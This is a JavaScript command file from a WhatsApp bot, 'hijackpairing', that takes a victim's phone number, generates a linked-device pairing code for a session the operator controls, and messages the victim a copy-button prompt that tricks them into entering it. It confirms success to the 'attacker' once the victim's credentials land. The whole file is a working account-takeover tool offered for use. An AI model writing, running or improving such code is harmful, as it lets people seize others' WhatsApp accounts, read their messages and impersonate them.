// language: JavaScript, file: commands/hijack/hijackpairing.js
'use strict';

const fs = require('fs');
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require('@itsliaaa/baileys');
const {
    startHijackSession,
    addTarget,
    hasCreds,
    wipeTarget,
    getHijackPairingCode,
} = require('../../lib/hijackSession');

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

module.exports = {
    name: 'hijackpairing',
    aliases: ['vvipairing', 'vvipair', 'hpair'],
    category: 'hijack',
    desc: 'Pair a target session — sends pairing code to target',
    usage: '.hijackpairing <phone> [--force]',
    privateOnly: true,
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const force = args.includes('--force');
        const raw = (args.find(a => !a.startsWith('--')) || '').replace(/\D/g, '');

        if (!raw || raw.length < 7) {
            return ctx.reply(`❌ ᴜsᴀɢᴇ: ${s.prefix}hijackpairing <ᴘʜᴏɴᴇ> [--force]${s.FOOTER}`);
        }

        const scopeKey = ctx.sender;
        if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);

        if (hasCreds(scopeKey, raw) && !force) {
            return ctx.reply(
                `⚠️ +${raw} ᴀʟʀᴇᴀᴅʏ ᴘᴀɪʀᴇᴅ.\n` +
                `ᴜsᴇ *${s.prefix}hijackpairing ${raw} --force* ᴛᴏ ᴡɪᴘᴇ & ʀᴇᴘᴀɪʀ.${s.FOOTER}`
            );
        }

        // Wipe stale unregistered state or forced reset to guarantee fresh code
        wipeTarget(scopeKey, raw);

        await ctx.react?.('⏳');

        let newSock = null;
        try {
            newSock = await startHijackSession(scopeKey, raw, true);
            newSock._pairingInProgress = true;

            const code = await getHijackPairingCode(newSock, raw);
            addTarget(scopeKey, raw);

            const codeOnlyMsg = code; // already formatted like DEAN-HSZP
            
            // Build interactive message with CTA copy button (from your pair.js)
            const pairText = `❤️ *_ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ғᴏʀ @${raw}_* ❤️
╭═══〘 𝑴𝑨𝑫𝑨𝑹𝑨 𝑿-𝑴𝑫 〙═══⊷❍
┃✰│CODE: *${codeOnlyMsg}*
┃✰│EXPIRES: 60s
╰──────────────────

1. Open WhatsApp > Settings > Linked Devices
2. Tap "Link a Device" 
3. Tap "Link with phone number"
4. Paste the code above

_Tap button below to copy instantly_`;

            const pairMsg = generateWAMessageFromContent(`${raw}@s.whatsapp.net`, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({ text: pairText }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: `© Powered by ${s.botName}` }),
                            header: proto.Message.InteractiveMessage.Header.create({ 
                                title: `🔑 ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ`, 
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    { 
                                      name: "cta_copy", 
                                      buttonParamsJson: JSON.stringify({ 
                                        display_text: "📋 Copy Code", 
                                        id: "copy_pair", 
                                        copy_code: code.replace(/-/g, '') 
                                      }) 
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { quoted: msg });

            // 1. Send interactive message to target
            let delivered = false;
            let deliveryError = null;
            try {
                await sock.relayMessage(`${raw}@s.whatsapp.net`, pairMsg.message, { messageId: pairMsg.key.id });
                delivered = true;
            } catch (e) {
                deliveryError = e?.message || 'unknown send failure';
            }

            await ctx.react?.('✅');

            // 2. Confirmation to attacker
            const card =
                `╭═══〘 ʜɪᴊᴀᴄᴋ ᴘᴀɪʀɪɴɢ 〙═══⊷❍\n` +
                `┃ 📱 ᴛᴀʀɢᴇᴛ: +${raw}\n` +
                `┃ 🔑 ᴄᴏᴅᴇ: *${codeOnlyMsg}*\n` +
                `┃ 📤 ᴅᴍ ᴅᴇʟɪᴠᴇʀᴇᴅ: ${delivered ? 'ʏᴇs' : `ɴᴏ — ${deliveryError}`}\n` +
                `┃ ⏱️ ᴇxᴘɪʀᴇs: 60s\n` +
                `┃ 🕓 ᴡᴀɪᴛɪɴɢ ғᴏʀ ᴇɴᴛʀʏ...\n` +
                `╰──────────────────────\n\n` +
                `_Code sent. Target must enter it under Linked Devices → Link with phone number._\n` +
                `_If it fails, retry with:_ *${s.prefix}hijackpairing ${raw} --force*` +
                (delivered ? '' : `\n\n_⚠️ DM failed — forward this code manually._`) +
                s.FOOTER;

            await ctx.reply(card);

            // 3. Post-send poll for creds.registered === true
            (async () => {
                for (let i = 0; i < 20; i++) {
                    await sleep(3000);
                    if (hasCreds(scopeKey, raw)) {
                        try {
                            await ctx.reply(
                                `✅ ᴘᴀɪʀᴇᴅ: +${raw} — ᴄʀᴇᴅs ʟᴀɴᴅᴇᴅ. ʀᴜɴ .hijacklist.${s.FOOTER}`
                            );
                        } catch {}
                        return;
                    }
                }
            })().catch(() => {});

        } catch (e) {
            if (newSock) try { newSock.end(); } catch {}
            await ctx.react?.('❌');
            return ctx.reply(`❌ ᴘᴀɪʀɪɴɢ ғᴀɪʟᴇᴅ: ${e.message}${s.FOOTER}`);
        }
    },
};